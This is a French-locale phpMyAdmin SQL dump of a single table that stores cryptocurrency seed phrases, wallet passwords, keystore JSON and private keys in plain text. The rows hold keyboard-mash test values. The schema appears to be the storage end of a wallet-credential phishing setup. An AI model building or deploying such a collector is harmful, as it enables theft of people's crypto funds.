-- phpMyAdmin SQL Dump
-- version 4.1.14
-- http://www.phpmyadmin.net
--
-- Client :  127.0.0.1
-- Généré le :  Sam 27 Août 2022 à 02:48
-- Version du serveur :  5.6.17
-- Version de PHP :  5.5.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Base de données :  `basedonne`
--

-- --------------------------------------------------------

--
-- Structure de la table `information`
--

CREATE TABLE IF NOT EXISTS `information` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `phrases` text NOT NULL,
  `wallet_password` varchar(255) NOT NULL,
  `keystore_json` varchar(255) NOT NULL,
  `private_key` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=23 ;

--
-- Contenu de la table `information`
--

INSERT INTO `information` (`id`, `phrases`, `wallet_password`, `keystore_json`, `private_key`) VALUES
(1, '', '', '', ''),
(2, 'azertyuiopmmlkjhgfdsq', '', '', ''),
(3, '', '', '', ''),
(4, '', '', '', ''),
(5, 'abcdefghijklmnopqrstuvwxyz', 'abcdefghijklmnopqrstuvwxyz', 'abcdefghijklmnopqrstuvwxyz', 'abcdefghijklmnopqrstuvwxyz'),
(6, '', '', '', ''),
(7, 'aety jhuog uorubou uihououo uhoohoojer uobÃ©rh uouhhuro uuobojt hohf bjziiubuo boubfuoe uboubhÃ©j ', 'aety jhuog uorubou uihououo uhoohoojer uobÃ©rh uouhhuro uuobojt hohf bjziiubuo boubfuoe uboubhÃ©j ', 'aety jhuog uorubou uihououo uhoohoojer uobÃ©rh uouhhuro uuobojt hohf bjziiubuo boubfuoe uboubhÃ©j ', 'aety jhuog uorubou uihououo uhoohoojer uobÃ©rh uouhhuro uuobojt hohf bjziiubuo boubfuoe uboubhÃ©j '),
(8, '', '', '', ''),
(9, '', '', '', ''),
(10, 'esgsee fq f qsfqs fqsf qsf qs fq s fqs f qsf q feqqfqef qefeq fq f e f eqfqs', '050470', '62654sgdsvqscqz', 'dcb123'),
(11, '', '', '', ''),
(12, '', '', '', ''),
(13, 'vhavlljd uazld bioazbljzd uvdougdav ojopcs pzipjz njcbvsa fafdu rteb nkcjoq maksoa  bhvkaqh', '050470', 'tyrfdesz2541', '123456'),
(14, '', '', '', ''),
(15, '', '', '', ''),
(16, 'uouhbkja cngdauig hkoiaf yhaibfjef jbgolbgfouze pajnknfe ihougagr yfgeufbgze ougfaoefg fogze goÃ§gufae gophif', '050470', 'oiusty8545', '123456'),
(17, '', '', '', ''),
(18, '', '', '', ''),
(19, 'gogrizbrizr ihpheip pihafnÃ©a Ã©araefÃ©Ã©&quot; abioba oabjfbueoofb oag&quot;lifbjbae obju&quot;r', '050470', '62545era', '123456'),
(20, '', '', '', ''),
(21, '', '', '', ''),
(22, '', '', '', '');

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
